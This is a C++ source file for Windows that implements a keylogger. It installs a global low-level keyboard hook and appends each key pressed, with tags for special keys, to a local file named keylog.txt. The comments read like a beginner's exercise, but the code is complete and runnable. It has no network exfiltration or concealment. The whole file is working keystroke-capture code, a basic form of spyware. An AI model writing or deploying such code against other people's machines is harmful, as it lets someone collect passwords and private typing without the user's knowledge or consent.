#include <iostream>
#include <fstream>   //writing into the file
#include <windows.h> //windows api- Keyboard hooking

// function declaration
void logkeystroke(int key)
{
    // handle writing to a file
    std::ofstream logfile;
    // open file in append mode and add keys
    logfile.open("keylog.txt", std::ios::app);

    if (key == VK_BACK)
    {
        logfile << "[BACKSPACE]";
    }
    else if (key == VK_RETURN)
    {
        logfile << "[ENTER]";
    }
    else if (key == VK_TAB)
    {
        logfile << "[TAB]";
    }
    else if (key == VK_SHIFT)
    {
        logfile << "[SHIFT]";
    }
    else if (key == VK_CONTROL)
    {
        logfile << "[CONTROL]";
    }
    else if (key == VK_ESCAPE)
    {
        logfile << "[ESC]";
    }
    else if (key == VK_OEM_PERIOD)
    {
        logfile << ".";
    }
    // ALPHABETIC keys (A-Z) and numbers(0-9) as the character itself.
    else if (key >= 'A' && key <= 'Z')
    {
        logfile << char(key); // log the uppercase processed
    }
    else if (key >= '0' && key <= '9')
    {
        logfile << char(key); // log the number processed.
    }
    else
    {
        logfile << "[" << key << "]"; // log other keys using their virtual key code
    }

    logfile.close();
}

// hook procedure to capture the keys
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // check if the key was pressed down
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        // contain the key event---using the windows api here
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        int key = pKeyboard->vkCode;
        logkeystroke(key);
    }
    // pass the event to the other hooks
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    // call the function
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);

    if (keyboardHook == NULL)
    {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // unhook keyboard when program stops
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}